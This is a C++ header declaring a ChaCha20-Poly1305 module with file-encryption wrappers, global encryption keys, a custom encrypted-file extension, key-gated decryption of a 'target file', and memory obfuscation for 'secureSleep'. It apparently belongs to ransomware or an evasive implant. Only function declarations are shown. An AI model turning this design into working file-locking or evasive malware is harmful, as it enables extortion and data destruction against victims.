// ============================================================================
// crypto.h — ChaCha20-Poly1305 Authenticated Encryption Module
// ============================================================================
// Pure C++ implementation — zero external dependencies, no Windows crypto APIs.
// ChaCha20: Stream cipher (DJ Bernstein's design, used in TLS 1.3)
// Poly1305: One-time MAC for authentication
// Combined: AEAD construction providing confidentiality + integrity
//
// Includes:
//   - chacha20Block / chacha20Encrypt
//   - Poly1305 MAC (poly1305Init / poly1305Process / poly1305Finish)
//   - chacha20Poly1305Encrypt / chacha20Poly1305Decrypt
//   - encryptSingleFile / decryptTargetFile (file-level wrappers)
//   - chacha20BufferObfuscate (memory encryption for secureSleep)
// ============================================================================
#pragma once

#include <vector>
#include <string>
#include <cstdint>
#include <cstring>
#include <fstream>
#include <iostream>
#include <random>

// ============================================================================
// CHACHA20-POLY1305 MODULE
// ============================================================================

#define CHACHA_QROUND(a, b, c, d) \
    a += b; d ^= a; d = (d << 16) | (d >> 16); \
    c += d; b ^= c; b = (b << 12) | (b >> 20); \
    a += b; d ^= a; d = (d << 8) | (d >> 24);  \
    c += d; b ^= c; b = (b << 7) | (b >> 25)

void chacha20Block(const uint8_t* key, uint32_t counter, const uint8_t* nonce, uint8_t* out);

std::vector<uint8_t> chacha20Encrypt(const std::vector<uint8_t>& data, const uint8_t* key,
                                const uint8_t* nonce, uint32_t counter_start = 0);

// Poly1305 state — standard 26-bit limb representation (RFC 8439).
struct Poly1305State {
    uint64_t h[5];       // accumulator limbs (26-bit each)
    uint64_t r[5];       // clamped key limbs (26-bit each)
    uint64_t pad[2];     // 128-bit key suffix (key[16..31])
    size_t   leftover;   // bytes buffered toward the next 16-byte block
    uint8_t  buffer[16]; // partial-block buffer
};

void poly1305Init(Poly1305State* s, const uint8_t key[32]);
void poly1305Process(Poly1305State* s, const uint8_t block[16], bool is_last);
void poly1305Finish(Poly1305State* s, uint8_t mac[16]);

std::vector<uint8_t> chacha20Poly1305Encrypt(const std::vector<uint8_t>& data,
                                        const uint8_t* key_32, const uint8_t* nonce_12);

std::vector<uint8_t> chacha20Poly1305Decrypt(const std::vector<uint8_t>& encrypted_with_tag,
                                        const uint8_t* key_32, const uint8_t* nonce_12);

void deriveKeyFromString(const std::string& str_key, uint8_t* out_32);

// ============================================================================
// FILE ENCRYPTION
// ============================================================================

std::string getEncryptedExt();
#define ENCRYPTED_EXT getEncryptedExt()

extern std::string encryption_key_global;
extern std::string nonce_global;
extern std::string last_encryption_algo;

std::string generateEncryptionKey();
std::string generateNonce();

std::vector<uint8_t> chacha20EncryptFileData(const std::vector<uint8_t>& data,
                                        const std::string& hex_key, const std::string& nonce);

std::vector<uint8_t> chacha20DecryptFileData(const std::vector<uint8_t>& encrypted_data,
                                        const std::string& hex_key, const std::string& nonce);

bool encryptSingleFile(const std::string& file_path);
bool encryptTargetFile();
bool decryptTargetFile(const std::string& provided_key);

// ============================================================================
// MEMORY OBJUSCATION - XOR buffer with ChaCha20 keystream (symmetric)
// ============================================================================
void chacha20BufferObfuscate(unsigned char* data, size_t length,
                             const uint8_t* key, const uint8_t* nonce,
                             uint32_t counter_start);
